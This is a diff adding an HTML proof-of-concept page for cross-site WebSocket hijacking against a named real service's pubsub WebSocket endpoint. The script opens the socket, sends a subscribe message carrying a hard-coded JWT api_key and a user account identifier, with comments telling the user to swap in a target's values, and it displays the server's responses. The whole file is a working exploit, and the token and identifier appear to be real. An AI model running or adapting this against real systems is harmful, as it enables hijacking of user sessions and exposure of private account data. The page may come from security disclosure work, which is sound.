@@ -1,0 +1,43 @@
+<html>
+<head>
+<title>CSWSH PoC</title>
+</head>
+<body>
+<h1>CSWSH PoC</h1>
+<pre id="log">Waiting...</pre>
+
+<script>
+const socket = new WebSocket("wss://pubsub.razersynapse.com/ws");
+
+socket.onopen = function () {
+const payload = {
+event: "subscribe",
+id: "1770214981366", // Example ID
+api_key: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3NzAyMTQwNzgsInV1aWQiOiJSWlJfMDAxMDM5NDQ0YmE2YjM4ZWY1YWRkNTRjZWEwZSJ9.O6JXP-wWL0ATzbDVFDoNEt5kmfrtXyUXGw5kctEviWw", // Replace with a valid/target JWT
+data: [
+"razerid.rzr_001039444ba6b38ef5add54cea0e@razerzone.com" // Replace with valid target value if available
+]
+};
+
+socket.send(JSON.stringify(payload));
+log("[+] WebSocket opened and subscription message sent");
+};
+
+socket.onmessage = function (e) {
+log("[+] Got response:\n" + e.data);
+};
+
+socket.onerror = function () {
+log("[!] WebSocket error");
+};
+
+socket.onclose = function () {
+log("[x] WebSocket closed");
+};
+
+function log(msg) {
+document.getElementById("log").textContent += "\n" + msg;
+}
+</script>
+</body>
+</html>
